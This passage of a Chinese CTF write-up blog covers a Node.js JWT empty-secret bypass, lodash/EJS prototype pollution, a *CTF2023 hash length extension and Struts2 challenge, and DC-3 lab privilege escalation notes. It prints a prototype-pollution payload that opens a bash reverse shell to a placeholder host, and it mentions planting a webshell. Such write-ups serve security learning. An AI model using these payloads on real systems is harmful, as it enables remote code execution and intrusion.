punctuation">;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">827</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âú®&#x2F;register‰∏ãÊ≥®ÂÜåÂêé123Ôºö123Ôºå‰ºöÁªô‰∏Ä‰∏™token<br><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MCwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY5MzU4NDM0NH0.i1rjUzM3MYuzBMzz3sW023l-mt4Sd6VAHkdS5UxYF3g</code><br>ÁôªÂΩïÊó∂ÈúÄË¶ÅÁî®Êà∑Âêç+ÂØÜÁ†Å+token„ÄÇ‰ΩÜÊòØÊàë‰ª¨Ê≥®ÂÜåÁöÑÁî®Êà∑‰∏çËÉΩ&#x2F;update„ÄÇ<br><img src="https://img-blog.csdnimg.cn/147fab8f0404456fb686b4acd0d9ec5d.png" alt="1"><br>Ëøô‰πüÂ∞±ÁÖßÂ∫î‰∫ÜËøôÈÉ®ÂàÜÈÄªËæë</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>            <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'U cant change uid'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Â¶ÇÊûúÁî®Êà∑ÂêçÊòØnssÂêéÈù¢ÊâçÊúâÂá∫flagÁöÑÂèØËÉΩ„ÄÇ‰ΩÜÊòØnssÁî®Êà∑Â∑≤ÁªèÂ≠òÂú®‰∫ÜÔºåËØ¥ÊòéËøôÈáåÈúÄË¶ÅÊàë‰ª¨ÁôªÂΩïnssÁî®Êà∑„ÄÇ<br>Áúã‰∏Ä‰∏ãtokenÂÄº<br><img src="https://img-blog.csdnimg.cn/86cbadda16d549b494ecc4c5c66dd2c8.png" alt="2"><br>ËøôÈáåÁöÑHS256‰πüÂ∞±ÊòØHMACÁÆóÊ≥ï</p><blockquote><p>‰∏∫‰∫ÜÈò≤Ê≠¢ÈªëÂÆ¢ÈÄöËøáÂΩ©ËôπË°®Ê†πÊçÆÂìàÂ∏åÂÄºÂèçÊé®ÂéüÂßãÂè£‰ª§ÔºåÂú®ËÆ°ÁÆóÂìàÂ∏åÁöÑÊó∂ÂÄôÂ¢ûÂä†‰∫Ü‰∏Ä‰∏™saltÊù•‰ΩøÂæóÁõ∏ÂêåÁöÑËæìÂÖ•‰πüËÉΩÂæóÂà∞‰∏çÂêåÁöÑÂìàÂ∏åÂÄºÔºåÂ¢ûÂ§ß‰∫ÜÈªëÂÆ¢Á†¥Ëß£ÂìàÂ∏åÁöÑÈöæÂ∫¶„ÄÇ<br>Â¶ÇÊûúsaltÊòØÊàë‰ª¨Ëá™Â∑±ÈöèÊú∫ÁîüÊàêÁöÑÔºåÈÄöÂ∏∏Êàë‰ª¨Âú®ËÆ°ÁÆóMD5Êó∂ÈááÁî®<code>md5(message+salt)</code>„ÄÇÂÆûÈôÖ‰∏äÂ∞±ÊòØÊääsaltÁúãÂÅö‰∏Ä‰∏™Âè£‰ª§ÔºåÂä†saltÁöÑÂìàÂ∏åÂ∞±ÊòØÔºöËÆ°ÁÆó‰∏ÄÊÆµmessageÁöÑÂìàÂ∏åÊó∂ÔºåÊ†πÊçÆ‰∏çÂêåÂè£‰ª§ËÆ°ÁÆóÂá∫‰∏çÂêåÁöÑÂìàÂ∏å„ÄÇË¶ÅÈ™åËØÅÂìàÂ∏åÂÄºÔºåÂøÖÈ°ªÂêåÊó∂Êèê‰æõÊ≠£Á°ÆÁöÑÂè£‰ª§„ÄÇ<br>ËøôÂÆûÈôÖ‰∏äÂ∞±ÊòØHmacÁÆóÊ≥ïÔºöKeyed-Hashing for Message Authentication„ÄÇÂÆÉÈÄöËøá‰∏Ä‰∏™Ê†áÂáÜÁÆóÊ≥ïÔºåÂú®ËÆ°ÁÆóÂìàÂ∏åÁöÑËøáÁ®ã‰∏≠ÔºåÊääkeyÊ∑∑ÂÖ•ËÆ°ÁÆóËøáÁ®ã‰∏≠„ÄÇ<br>ÂíåÊàë‰ª¨Ëá™ÂÆö‰πâÁöÑÂä†saltÁÆóÊ≥ï‰∏çÂêåÔºåHmacÁÆóÊ≥ïÈíàÂØπÊâÄÊúâÂìàÂ∏åÁÆóÊ≥ïÈÉΩÈÄöÁî®ÔºåÊó†ËÆ∫ÊòØMD5ËøòÊòØSHA-1„ÄÇÈááÁî®HmacÊõø‰ª£Êàë‰ª¨Ëá™Â∑±ÁöÑsaltÁÆóÊ≥ïÔºåÂèØ‰ª•‰ΩøÁ®ãÂ∫èÁÆóÊ≥ïÊõ¥Ê†áÂáÜÂåñÔºå‰πüÊõ¥ÂÆâÂÖ®„ÄÇ</p></blockquote><p>ÂÜÖÂÆπ‰∏≠ÊúâÊó∂Èó¥Êà≥ÔºàÊó∂Èó¥Êà≥‰ª£Ë°®Ëøô‰∏™jwtËÆ∏ÂèØÁ≠æÂèëÁöÑÊó∂Èó¥ÔºåËøá‰∫Ü‰∏ÄÊÆµÊó∂Èó¥Á≠æÂêçÂ∞±‰ºöÂ§±ÊïàÔºåÂú®jwt.verifyÁöÑÊó∂ÂÄôÂ∞±‰ºöÈ™åËØÅËøô‰∏™iatÊù•Âà§Êñ≠jwtÁöÑÊúâÊïàÊÄß„ÄÇÔºâ<br>&#x2F;loginÂèØ‰ª•ÁúãÂá∫jwtËØ•Â¶Ç‰Ωï‰º™ÈÄ†Ôºö</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>secretÂì™Êù•ÁöÑÂë¢Ôºü</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sidÂèàÊòØÂì™Êù•ÁöÑÂë¢Ôºü</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sidÂ∞±ÊòØÊàë‰ª¨‰º†ÂÖ•jwtÈáåÈù¢ÁöÑsecretidÔºåÂêéÈù¢È™åËØÅ‰∫Üsid‰∏çËÉΩ‰∏∫nullÔºàÁ©∫ÔºâÂíåundefinedÔºåÈÇ£‰πüÂ∞±‰∏çËÉΩÈÄöËøáÁõ¥Êé•ÁΩÆÁ©∫sidÊù•ÁªïËøáÔºåsecretÊòØÁõ¥Êé•ÈÄöËøásecret[sid]Ëé∑ÂèñÔºåÈÇ£‰πàËøô‰∏™sidÂ∞±Áõ¥Êé•‰º†ÂÖ•‰∏Ä‰∏™<code>[]</code>ÔºåÂ∞±ÂèØ‰ª•ÂØºËá¥secret‰∏∫Á©∫ÔºåÈÇ£‰πàjwtÁõ¥Êé•ÊåáÂÆöÁ©∫ÁÆóÊ≥ï‰πüÂ∞±ÂèØ‰ª•ÈÄöËøáÈ™åËØÅ„ÄÇ<br><img src="https://img-blog.csdnimg.cn/28f08cdf50bb4c89a25f55d92309001b.png" alt="5"><br>ÁÑ∂ÂêéÊàêÂäüÁôªÂΩïnss„ÄÇ</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/update'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>            <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'U cant change uid'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÁÑ∂ÂêéËøôÈáå<code>lodash.merge</code>Êúâ‰∏™ejsÂéüÂûãÈìæÊ±°ÊüìrceÔºå‰ΩøÁî®‰∏ãÈù¢Ëøô‰∏™ËøõË°åÂèçÂºπshell„ÄÇ</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>    <span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">"client"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string-property property">"escapeFunction"</span><span class="token operator">:</span><span class="token string">"1; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/x.x.x.x/4444 0>&amp;1\"');"</span><span class="token punctuation">,</span><span class="token string-property property">"compileDebug"</span><span class="token operator">:</span><span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/d7cdae347d354d2095b299a191781c92.png" alt="1"><br>ÁÑ∂ÂêéÂú®vpsÂºÄÂêØÁõëÂê¨ÂêéËÆøÈóÆ&#x2F;homeÂêéshellÂç≥ÂèØÂèçÂºπÂà∞vps‰∏ä„ÄÇ<br><img src="https://img-blog.csdnimg.cn/d9aca416514840d5a8bda2d576dd09c7.png" alt="6"><br>Êü•ÁúãÁéØÂ¢ÉÂèòÈáèÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/b13276b67e4c413d9828703a218e0f81.png" alt="6"></p><h3 id="ÊúÄÂêé"><a href="#ÊúÄÂêé" class="headerlink" title="ÊúÄÂêé"></a>ÊúÄÂêé</h3><p>ËµÑÊñô<br><a href="https://xz.aliyun.com/t/6776#toc-8">ÊîªÂáªJWTÁöÑ‰∏Ä‰∫õÊñπÊ≥ï</a><br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1183198304823296">hmac</a></p>]]></content>
      
      
      <categories>
          
          <category> Ëµõ‰∫ãWP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(ÂÖ≠Êòü)CTF2023</title>
      <link href="/2023/07/30/(%E5%85%AD%E6%98%9F)CTF2023/"/>
      <url>/2023/07/30/(%E5%85%AD%E6%98%9F)CTF2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://img-blog.csdnimg.cn/471de38845874a84a1a1673a28a23118.jpeg#pic_center" alt="*CTF2023"></p><p><img src="https://img-blog.csdnimg.cn/326ea0d2418342a985041a588461e760.png" alt="1"></p><h2 id="MISC-snippingTools"><a href="#MISC-snippingTools" class="headerlink" title="MISC-snippingTools"></a>MISC-snippingTools</h2><p>cve-2023-28303<br>ÊâæÂà∞‰∏Ä‰∏™exp</p><p><a href="https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02">https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02</a></p><p>Âà©Áî®ËÑöÊú¨ËøêË°åÔºåÈ¢òÁõÆ‰∏≠ËØ¥Êà™ÂèñÊï¥‰∏™Â±èÂπïÈÇ£‰πüÂ∞±ÊòØ2560*1600</p><p>ËøêË°åËÑöÊú¨</p><blockquote><p>python 1.py 2560 1600 1.png 2.png</p></blockquote><p>ÂæóÂà∞2.pngÂõæÁâá</p><p>flagÁúã‰∏çÊ∏ÖÂà©Áî®Stegsolve.jarÁü´Ê≠£</p><p><img src="https://img-blog.csdnimg.cn/e8ee345b4f5546ba8ea1ef6bc526e853.png#pic_center" alt="1"></p><p>*ctf{cve-2023-28303-windows-snipping-tool-is-not-secure-4E9019139D9A}</p><h2 id="WEB-jwt2struts"><a href="#WEB-jwt2struts" class="headerlink" title="WEB-jwt2struts"></a>WEB-jwt2struts</h2><p>ËÄÉÂØüÁöÑÁü•ËØÜÁÇπÔºö</p><blockquote><p>JWT+HASHÊâ©Â±ïÊîªÂáª+struct2ÊºèÊ¥û</p></blockquote><p><img src="https://img-blog.csdnimg.cn/dd019c9dd6014989aa2bfce816280f5e.png" alt="1"></p><p>Â∞Üaccess_token‰∏≠ÁöÑËß£ÂØÜÂêéÂèØÁü•Áî®Êà∑‰∏∫userÔºåË¶ÅÊîπ‰∏∫adminÔºåÂ∞±ÈúÄË¶ÅÁü•ÈÅìkey„ÄÇ<br><img src="https://img-blog.csdnimg.cn/2493b913c66145efb9947b91334c386c.png" alt="2"><br>Êü•ÁúãÊ∫êÁ†Å‰πãÂêéÂèëÁé∞Ë∑ØÂæÑ<code>JWT_key.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"./secret_key.php"</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"./salt.php"</span><span class="token punctuation">;</span><span class="token comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span><span class="token comment">//md5($salt."adminroot")=e6ccbf12de9d33ec27a5bcfb6a3293df</span>@<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"digest"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"digest"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token operator">.</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"The secret_key is "</span><span class="token operator">.</span> <span class="token variable">$secret_key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"Your cookies don't match up! STOP HACKING THIS SITE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>hashÈïøÂ∫¶Êâ©Â±ïÊîªÂáªÔºåËøôÈáåÊé®Ëçê‰∏ÄÁØáÊñáÁ´†<a href="https://ventureyu.github.io/2018/08/14/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95/">ÂìàÂ∏åÈïøÂ∫¶Êâ©Â±ïÊîªÂáª</a><br>ËøôÈáå‰ΩøÁî®Âà∞Â∑•ÂÖ∑hashpump<br><img src="https://img-blog.csdnimg.cn/672b58df3ff446078a98821ee0bf7a5c.png" alt="2"></p><p>Â∞Ü<code>\x</code>Êîπ‰∏∫<code>%</code>ÔºåÂæóÂà∞key<code>sk-he00lctf3r</code><br><img src="https://img-blog.csdnimg.cn/338b99d6f5db4cad8a6ab2ff08fc8871.png" alt="123"><br>ÂÜçËÆøÈóÆÁΩëÁ´ôË∑≥ËΩ¨Âà∞&#x2F;admiiiiiiiiiiin„ÄÇ<br><img src="https://img-blog.csdnimg.cn/b7edcf764280415dbf8e4b5da9dda22d.png" alt="1"><br>Êü•ÁúãÊ∫êÁ†Å<br><img src="https://img-blog.csdnimg.cn/8b32d79da7a74173907f4b7bbc5b4413.png" alt="2"><br>‰ΩøÁî®ÊºèÊ¥ûÊ£ÄÊµãÂ∑•ÂÖ∑Ê£ÄÊµãÔºåÂ§çÂà∂ÁΩëÂùÄ<strong><a href="http://140.210.223.216:55557/admiiiiiiiiiiin/user.action">http://140.210.223.216:55557/admiiiiiiiiiiin/user.action</a></strong><br>Ê£ÄÊµãÂà∞ÊºèÊ¥û</p><p><img src="https://img-blog.csdnimg.cn/39f533a11214400bb63fd2e1141eeab1.png" alt="3"><br>Êü•ÁúãÁéØÂ¢ÉÂèòÈáèÂæóÂà∞flag</p><p><img src="https://img-blog.csdnimg.cn/85007a54f8e44a86a5111539041c805e.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> Ëµõ‰∫ãWP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3</title>
      <link href="/2023/07/23/DC-3/"/>
      <url>/2023/07/23/DC-3/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h2><p>Ëøô‰∏™Èù∂Âú∫Â∞±‰∏Ä‰∏™ÁõÆÁöÑ‚Äî‚ÄîÊèêÊùÉ„ÄÇ‰∏ªË¶ÅÂÜô‰∏Ä‰∏ãÂÖ≥ÈîÆÁöÑÁü•ËØÜÁÇπÔºåÂÆåÊï¥ÊµÅÁ®ã‰∏çÂÜô‰∫Ü„ÄÇ</p><h2 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h2><h3 id="dirbÂ∑•ÂÖ∑ËøõË°åÊâ´ÊèèÁõÆÂΩï"><a href="#dirbÂ∑•ÂÖ∑ËøõË°åÊâ´ÊèèÁõÆÂΩï" class="headerlink" title="dirbÂ∑•ÂÖ∑ËøõË°åÊâ´ÊèèÁõÆÂΩï"></a>dirbÂ∑•ÂÖ∑ËøõË°åÊâ´ÊèèÁõÆÂΩï</h3><p>‰ª•ÂêéÊâ´ÁõÆÂΩïÊòØÂèàÊúâ‰∏Ä‰∏™Êñ∞ÁöÑÂ∑•ÂÖ∑‚Äî‚Äîdirb„ÄÇ<br>‰ΩøÁî®ÊñπÊ≥ï</p><blockquote><p>Ê†ºÂºèÔºödirb <url_base> [&lt;wordlist_file(s)&gt;] [options]<br>-a ËÆæÁΩÆuser-agent<br>-p &lt;proxy[:port]&gt;ËÆæÁΩÆ‰ª£ÁêÜ<br>-c ËÆæÁΩÆcookie<br>-z Ê∑ªÂä†ÊØ´ÁßíÂª∂ËøüÔºåÈÅøÂÖçÊ¥™Ê∞¥ÊîªÂáª<br>-o ËæìÂá∫ÁªìÊûú<br>-X Âú®ÊØè‰∏™Â≠óÂÖ∏ÁöÑÂêéÈù¢Ê∑ªÂä†‰∏Ä‰∏™ÂêéÁºÄ<br>-H Ê∑ªÂä†ËØ∑Ê±ÇÂ§¥<br>-i ‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÊêúÁ¥¢</p></blockquote><p>ËØ¶ÁªÜ‰ΩøÁî®ÊñπÊ≥ïÁúãËøôÁØáÊñáÁ´†<a href="https://xz.aliyun.com/t/3958">John the Ripper</a></p><h3 id="searchsploit-Â∑•ÂÖ∑ËøõË°åÊêúÁ¥¢ÊºèÊ¥û"><a href="#searchsploit-Â∑•ÂÖ∑ËøõË°åÊêúÁ¥¢ÊºèÊ¥û" class="headerlink" title="searchsploit Â∑•ÂÖ∑ËøõË°åÊêúÁ¥¢ÊºèÊ¥û"></a>searchsploit Â∑•ÂÖ∑ËøõË°åÊêúÁ¥¢ÊºèÊ¥û</h3><p>ÁÆÄ‰ªãÔºösearchsploitÊòØ‰∏Ä‰∏™Áî®‰∫éExploit-DBÁöÑÂëΩ‰ª§Ë°åÊêúÁ¥¢Â∑•ÂÖ∑ÔºåÂèØ‰ª•Â∏ÆÂä©Êàë‰ª¨Êü•ÊâæÊ∏óÈÄèÊ®°Âùó„ÄÇ<br>‰ΩøÁî®ÊñπÊ≥ïÔºö</p><p><img src="https://img-blog.csdnimg.cn/f6ff9033f2e14dd9a0d739b36280842c.png" alt="1"></p><p>Âú®ÊêúÁ¥¢Âà∞ÊºèÊ¥ûÂêéÂ∞ÜÊñá‰ª∂Â§çÂà∂Âà∞ÊåáÂÆöÁõÆÂΩï</p><blockquote><p><code>cp /usr/share/exploitdb/exploits/php/webapps/42033.txt ./Desktop/</code></p></blockquote><p>ÊàëÂΩìÊó∂Êú¨Âú∞ÊúâËøô‰∏Ä‰∏™POCÂ∞±Áõ¥Êé•Áî®sqlmapÁõ¥Êé•Êä•Âá∫Êù•‰∫ÜË¥¶Âè∑ÂØÜÁ†Å„ÄÇ</p><h3 id="johnÂ∑•ÂÖ∑ËøõË°åÂØÜÁ†ÅÁ†¥Ëß£"><a href="#johnÂ∑•ÂÖ∑ËøõË°åÂØÜÁ†ÅÁ†¥Ëß£" class="headerlink" title="johnÂ∑•ÂÖ∑ËøõË°åÂØÜÁ†ÅÁ†¥Ëß£"></a>johnÂ∑•ÂÖ∑ËøõË°åÂØÜÁ†ÅÁ†¥Ëß£</h3><p>ÂÖàÂàõÂª∫‰∏Ä‰∏™txtÊñá‰ª∂ÔºåÂÜôÂÖ•ÂØÜÊñá„ÄÇ<br>ÁÑ∂Âêé‰ΩøÁî®ÂëΩ‰ª§john 1.txtÔºåÂæàÂø´Â∞±ÁàÜÁ†¥Âá∫ÂØÜÁ†Å‰∫Ü„ÄÇ<br><img src="https://img-blog.csdnimg.cn/b06439e17edc43c8984860f6c30511ee.png" alt="2"><br>ÁôªÂΩïÂêéÂè∞‰πãÂêéÂÜôÂÖ•‰∏ÄÂè•ËØùÊú®È©¨„ÄÇ<br><img src="https://img-blog.csdnimg.cn/a276bfdc2f1a4d4dba03be0f85a5102c.png" alt="3"></p><p>Êàë‰∏ÄÂºÄÂßãÁî®ËöÅÂâëËøûÊé•‰πãÂêéËøõË°åÂÜÖÊ†∏ÊèêÊùÉÁªìÊûúÊúÄÂêéÂ§±Ë¥•‰∫ÜÔºåÂèçÂºπshell‰πãÂêéÊèêÊùÉÊàêÂäü„ÄÇ</p><h3 